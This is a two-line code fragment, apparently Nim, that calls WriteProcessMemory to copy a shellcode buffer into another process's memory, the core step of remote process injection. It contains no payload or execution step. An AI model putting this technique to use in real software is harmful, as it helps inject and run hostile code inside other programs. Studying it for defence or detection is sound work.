var bytesWritten: SIZE_T
WriteProcessMemory(pHandle, rPtr, unsafeAddr shellcode, cast[SIZE_T](shellcode.len), addr bytesWritten)
